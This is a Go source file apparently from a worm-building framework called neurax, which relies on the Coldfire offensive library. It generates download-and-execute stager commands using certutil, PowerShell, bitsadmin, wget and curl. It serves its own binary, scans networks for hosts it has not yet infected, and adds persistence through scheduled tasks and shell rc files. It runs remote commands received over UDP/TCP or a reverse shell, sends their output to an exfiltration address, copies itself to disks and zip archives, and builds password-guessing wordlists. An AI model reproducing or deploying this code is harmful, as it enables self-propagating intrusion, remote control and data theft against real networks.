package neurax

import (
	"bufio"
	"bytes"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net"
	"net/http"
	"os"
	"runtime"
	"strconv"
	"strings"
	"time"

	portscanner "github.com/anvie/port-scanner"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"github.com/mostlygeek/arp"
	coldfire "github.com/redcode-labs/Coldfire"
	"github.com/yelinaung/go-haikunator"
)

var InfectedHosts = []string{}
var ReceivedCommands = []string{}

type __NeuraxConfig struct {
	Stager          string
	Port            int
	CommPort        int
	CommProto       string
	LocalIp         string
	Path            string
	FileName        string
	Platform        string
	Cidr            string
	ScanPassive     bool
	ScanTimeout     int
	ScanAll         bool
	ReadArpCache    bool
	Threads         int
	FullRange       bool
	Base64          bool
	RequiredPort    int
	Verbose         bool
	Remove          bool
	ScanInterval    string
	ReverseListener string
	PreventReexec   bool
	ExfilAddr       string
}

var NeuraxConfig = __NeuraxConfig{
	Stager:          "random",
	Port:            6741, //coldfire.RandomInt(2222, 9999),
	CommPort:        7777,
	CommProto:       "udp",
	RequiredPort:    0,
	LocalIp:         coldfire.GetLocalIp(),
	Path:            "random",
	FileName:        "random",
	Platform:        runtime.GOOS,
	Cidr:            coldfire.GetLocalIp() + "/24",
	ScanPassive:     false,
	ScanTimeout:     2,
	ScanAll:         false,
	ReadArpCache:    false,
	Threads:         10,
	FullRange:       false,
	Base64:          false,
	Verbose:         false,
	Remove:          false,
	ScanInterval:    "2m",
	ReverseListener: "none",
	PreventReexec:   true,
	ExfilAddr:       "none",
}

//Verbose error printing
func ReportError(message string, e error) {
	if e != nil && NeuraxConfig.Verbose {
		fmt.Printf("ERROR %s: %s", message, e.Error())
		if NeuraxConfig.Remove {
			os.Remove(os.Args[0])
		}
	}
}

//Returns a command stager that downloads and executes current binary
func NeuraxStager() string {
	stagers := [][]string{}
	stager := []string{}
	paths := []string{}
	b64_decoder := ""
	windows_stagers := [][]string{
		[]string{"certutil", `certutil.exe -urlcache -split -f URL && B64 SAVE_PATH\FILENAME`},
		[]string{"powershell", `Invoke-WebRequest URL/FILENAME -O SAVE_PATH\FILENAME && B64 SAVE_PATH\FILENAME`},
		[]string{"bitsadmin", `bitsadmin /transfer update /priority high URL SAVE_PATH\FILENAME && B64 SAVE_PATH\FILENAME`},
	}
	linux_stagers := [][]string{
		[]string{"wget", `wget -O SAVE_PATH/FILENAME URL; B64 chmod +x SAVE_PATH/FILENAME; SAVE_PATH./FILENAME`},
		[]string{"curl", `curl URL/FILENAME > SAVE_PATH/FILENAME; B64 chmod +x SAVE_PATH/FILENAME; SAVE_PATH./FILENAME`},
	}
	linux_save_paths := []string{"/tmp/", "/lib/", "/home/",
		"/etc/", "/usr/", "/usr/share/"}
	windows_save_paths := []string{`C:\$recycle.bin\`, `C:\ProgramData\MicrosoftHelp\`}
	switch NeuraxConfig.Platform {
	case "windows":
		stagers = windows_stagers
		paths = windows_save_paths
		if NeuraxConfig.Base64 {
			b64_decoder = "certutil -decode SAVE_PATH/FILENAME SAVE_PATH/FILENAME;"
		}
	case "linux", "darwin":
		stagers = linux_stagers
		paths = linux_save_paths
		if NeuraxConfig.Base64 {
			b64_decoder = "cat SAVE_PATH/FILENAME|base64 -d > SAVE_PATH/FILENAME;"
		}
	}
	if NeuraxConfig.Stager == "random" {
		stager = coldfire.RandomSelectStrNested(stagers)
	} else {
		for s := range stagers {
			st := stagers[s]
			if st[0] == NeuraxConfig.Stager {
				stager = st
			}
		}
	}
	selected_stager_command := stager[1]
	if NeuraxConfig.Path == "random" {
		NeuraxConfig.Path = coldfire.RandomSelectStr(paths)
	}
	if NeuraxConfig.FileName == "random" && NeuraxConfig.Platform == "windows" {
		NeuraxConfig.FileName += ".exe"
	}
	url := fmt.Sprintf("http://%s:%d/%s", NeuraxConfig.LocalIp, NeuraxConfig.Port, NeuraxConfig.FileName)
	selected_stager_command = strings.Replace(selected_stager_command, "URL", url, -1)
	selected_stager_command = strings.Replace(selected_stager_command, "FILENAME", NeuraxConfig.FileName, -1)
	selected_stager_command = strings.Replace(selected_stager_command, "SAVE_PATH", NeuraxConfig.Path, -1)
	selected_stager_command = strings.Replace(selected_stager_command, "B64", b64_decoder, -1)
	return selected_stager_command
}

//Binary serves itself
func NeuraxServer() {
	/*if NeuraxConfig.prevent_reinfect {
		go net.Listen("tcp", "0.0.0.0:"+NeuraxConfig.knock_port)
	}*/
	data, _ := ioutil.ReadFile(os.Args[0])
	if NeuraxConfig.Base64 {
		data = []byte(coldfire.B64E(string(data)))
	}
	addr := fmt.Sprintf(":%d", NeuraxConfig.Port)
	go http.ListenAndServe(addr, http.HandlerFunc(func(rw http.ResponseWriter, r *http.Request) {
		http.ServeContent(rw, r, NeuraxConfig.FileName, time.Now(), bytes.NewReader(data))
	}))
}

//Returns true if host is active
func IsHostActive(target string) bool {
	first := 19
	last := 300
	if NeuraxConfig.FullRange {
		last = 65535
	}
	ps := portscanner.NewPortScanner(target, time.Duration(NeuraxConfig.ScanTimeout)*time.Second, NeuraxConfig.Threads)
	opened_ports := ps.GetOpenedPort(first, last)
	if len(opened_ports) != 0 {
		if NeuraxConfig.RequiredPort == 0 {
			return true
		} else {
			if coldfire.PortscanSingle(target, NeuraxConfig.RequiredPort) {
				return true
			}
		}
	}
	return false
}

//Returns true if host is infected
func IsHostInfected(target string) bool {
	if coldfire.Contains(InfectedHosts, target) {
		return true
	}
	target_url := fmt.Sprintf("http://%s:%d/", target, NeuraxConfig.Port)
	rsp, err := http.Get(target_url)
	if err != nil {
		return false
	}
	if rsp.StatusCode == 200 {
		InfectedHosts = append(InfectedHosts, target)
		InfectedHosts = coldfire.RemoveFromSlice(InfectedHosts, coldfire.GetLocalIp())
		return true
	}
	return false
}

/*func handle_revshell_conn() {
	message, _ := bufio.NewReader(conn).ReadString('\n')
	out, err := exec.Command(strings.TrimSuffix(message, "\n")).Output()
	if err != nil {
		fmt.Fprintf(conn, "%s\n", err)
	}
	fmt.Fprintf(conn, "%s\n", out)
}

func NeuraxSignal(addr string) {
	conn, err := net.Dial("udp", addr)
	ReportError("Cannot establish reverse UDP conn", err)
	for {
		handle_revshell_conn(conn)
	}
}*/

func add_persistent_command(cmd string) {
	if runtime.GOOS == "windows" {
		coldfire.CmdOut(fmt.Sprintf(`schtasks /create /tn "MyCustomTask" /sc onstart /ru system /tr "cmd.exe /c %s`, cmd))
	} else {
		coldfire.CmdOut(fmt.Sprintf(`echo "%s" >> ~/.bashrc; echo "%s" >> ~/.zshrc`, cmd, cmd))
	}
}

func handle_command(cmd string) {
	if NeuraxConfig.PreventReexec {
		if coldfire.Contains(ReceivedCommands, cmd) {
			return
		}
		ReceivedCommands = append(ReceivedCommands, cmd)
	}
	DataSender := coldfire.SendDataUDP
	forwarded_preamble := ""
	if NeuraxConfig.CommProto == "tcp" {
		DataSender = coldfire.SendDataTCP
	}
	preamble := strings.Fields(cmd)[0]
	can_execute := true
	if strings.Contains(preamble, "e") {
		if !coldfire.IsRoot() {
			can_execute = false
		}
	}
	if strings.Contains(preamble, "k") {
		forwarded_preamble = preamble
	}
	if strings.Contains(preamble, ":") {
		cmd = strings.Join(strings.Fields(cmd)[1:], " ")
		if strings.Contains(preamble, "s") {
			time.Sleep(time.Duration(coldfire.RandomInt(1, 5)))
		}
		if strings.Contains(preamble, "p") {
			add_persistent_command(cmd)
		}
		if strings.Contains(preamble, "x") && can_execute {
			out, err := coldfire.CmdOut(cmd)
			if err != nil {
				out += ": " + err.Error()
			}
			if strings.Contains(preamble, "d") {
				fmt.Println(out)
			}
			if strings.Contains(preamble, "v") {
				host := strings.Split(NeuraxConfig.ExfilAddr, ":")[0]
				port := strings.Split(NeuraxConfig.ExfilAddr, ":")[1]
				p, _ := strconv.Atoi(port)
				coldfire.SendDataTCP(host, p, out)
			}
			if strings.Contains(preamble, "l") && can_execute {
				for {
					coldfire.CmdRun(cmd)
				}
			}
		}
		if strings.Contains(preamble, "a") {
			for _, host := range InfectedHosts {
				err := DataSender(host, NeuraxConfig.CommPort, fmt.Sprintf("%s %s", forwarded_preamble, cmd))
				ReportError("Cannot send command", err)
				if strings.Contains(preamble, "o") && !strings.Contains(preamble, "m") {
					break
				}
			}
		}
		if strings.Contains(preamble, "r") {
			coldfire.Remove()
			os.Exit(0)
		}
		if strings.Contains(preamble, "q") {
			coldfire.Shutdown()
		}
	} else {
		if cmd == "purge" {
			NeuraxPurgeSelf()
		}
		coldfire.CmdOut(cmd)
	}
}

//Opens port (.CommPort) and waits for commands
func NeuraxOpenComm() {
	l, err := net.Listen(NeuraxConfig.CommProto, "0.0.0.0:"+strconv.Itoa(NeuraxConfig.CommPort))
	ReportError("Comm listen error", err)
	for {
		conn, err := l.Accept()
		ReportError("Comm accept error", err)
		buff := make([]byte, 1024)
		len, _ := conn.Read(buff)
		cmd := string(buff[:len-1])
		go handle_command(cmd)
		conn.Close()
	}
}

//Launches a reverse shell. Each received command is passed to handle_command()
func NeuraxReverse(proto string) {
	conn, _ := net.Dial(proto, NeuraxConfig.ReverseListener)
	for {
		command, err := bufio.NewReader(conn).ReadString('\n')
		if err != nil {
			break
		}
		command = strings.TrimSuffix(command, "\n")
		go handle_command(command)
	}
}

func neurax_ScanPassive_single_iface(c chan string, iface string) {
	var snapshot_len int32 = 1024
	timeout := 5000000000 * time.Second
	handler, err := pcap.OpenLive(iface, snapshot_len, false, timeout)
	ReportError("Cannot open device", err)
	handler.SetBPFFilter("arp")
	defer handler.Close()
	packetSource := gopacket.NewPacketSource(handler, handler.LinkType())
	for packet := range packetSource.Packets() {
		ip_layer := packet.Layer(layers.LayerTypeIPv4)
		if ip_layer != nil {
			ip, _ := ip_layer.(*layers.IPv4)
			source := fmt.Sprintf("%s", ip.SrcIP)
			destination := fmt.Sprintf("%s", ip.DstIP)
			if source != coldfire.GetLocalIp() && !IsHostInfected(source) {
				c <- source
			}
			if destination != coldfire.GetLocalIp() && !IsHostInfected(destination) {
				c <- destination
			}
		}
	}
}

func neurax_ScanPassive(c chan string) {
	current_iface, _ := coldfire.Iface()
	ifaces_to_use := []string{current_iface}
	device_names := []string{}
	devices, err := pcap.FindAllDevs()
	for _, dev := range devices {
		device_names = append(device_names, dev.Name)
	}
	ReportError("Cannot obtain network interfaces", err)
	if NeuraxConfig.ScanAll {
		ifaces_to_use = append(ifaces_to_use, device_names...)
	}
	for _, device := range ifaces_to_use {
		go neurax_ScanPassive_single_iface(c, device)
	}
}

func neurax_scan_active(c chan string) {
	targets := []string{}
	if NeuraxConfig.ReadArpCache {
		for ip, _ := range arp.Table() {
			if !IsHostInfected(ip) {
				targets = append(targets, ip)
			}
		}
	}
	full_addr_range, _ := coldfire.ExpandCidr(NeuraxConfig.Cidr)
	for _, addr := range full_addr_range {
		targets = append(targets, addr)
	}
	targets = coldfire.RemoveFromSlice(targets, coldfire.GetLocalIp())
	for _, target := range targets {
		if IsHostActive(target) && !IsHostInfected(target) {
			c <- target
		}
	}
}

func neurax_scan_core(c chan string) {
	if NeuraxConfig.ScanPassive {
		neurax_ScanPassive(c)
	} else {
		neurax_scan_active(c)
	}
}

//Scans network for new hosts
func NeuraxScan(c chan string) {
	for {
		neurax_scan_core(c)
		time.Sleep(time.Duration(coldfire.IntervalToSeconds(NeuraxConfig.ScanInterval)))
	}
}

//Copies current binary to all found disks
func NeuraxDisks() error {
	selected_name := gen_haiku()
	if runtime.GOOS == "windows" {
		selected_name += ".exe"
	}
	disks, err := coldfire.Disks()
	if err != nil {
		return err
	}
	for _, d := range disks {
		err := coldfire.CopyFile(os.Args[0], d+"/"+selected_name)
		if err != nil {
			return err
		}
	}
	return nil
}

//Creates an infected .zip archive with given number of random files from current dir.
func NeuraxZIP(num_files int) error {
	archive_name := gen_haiku() + ".zip"
	files_to_zip := []string{os.Args[0]}
	files, err := coldfire.CurrentDirFiles()
	if err != nil {
		return err
	}
	for i := 0; i < num_files; i++ {
		index := rand.Intn(len(files_to_zip))
		files_to_zip = append(files_to_zip, files[index])
		files[index] = files[len(files)-1]
		files = files[:len(files)-1]
	}
	return coldfire.MakeZip(archive_name, files_to_zip)
}

//The binary zips itself and saves under save name in archive
func NeuraxZIPSelf() error {
	archive_name := os.Args[0] + ".zip"
	files_to_zip := []string{os.Args[0]}
	return coldfire.MakeZip(archive_name, files_to_zip)
}

func gen_haiku() string {
	haikunator := haikunator.New(time.Now().UTC().UnixNano())
	return haikunator.Haikunate()
}

//Removes binary from all nodes that can be reached
func NeuraxPurge() {
	DataSender := coldfire.SendDataUDP
	if NeuraxConfig.CommProto == "tcp" {
		DataSender = coldfire.SendDataTCP
	}
	for _, host := range InfectedHosts {
		err := DataSender(host, NeuraxConfig.CommPort, "purge")
		ReportError("Cannot perform purge", err)
	}
	handle_command("purge")
}

//Removes binary from host and quits
func NeuraxPurgeSelf() {
	os.Remove(os.Args[0])
	os.Exit(0)
}

//Returns transformed words from input slice
func NeuraxWordlist(words []string) []string {
	wordlist := []string{}
	for _, word := range words {
		first_to_upper := strings.ToUpper(string(word[0])) + string(word[1:])
		wordlist = append(wordlist, strings.ToUpper(word))
		wordlist = append(wordlist, coldfire.Revert(word))
		wordlist = append(wordlist, first_to_upper)
		wordlist = append(wordlist, first_to_upper+"1")
		wordlist = append(wordlist, first_to_upper+"12")
		wordlist = append(wordlist, first_to_upper+"123")
		wordlist = append(wordlist, word+"1")
		wordlist = append(wordlist, word+"12")
		wordlist = append(wordlist, word+"123")
	}
	return wordlist
}
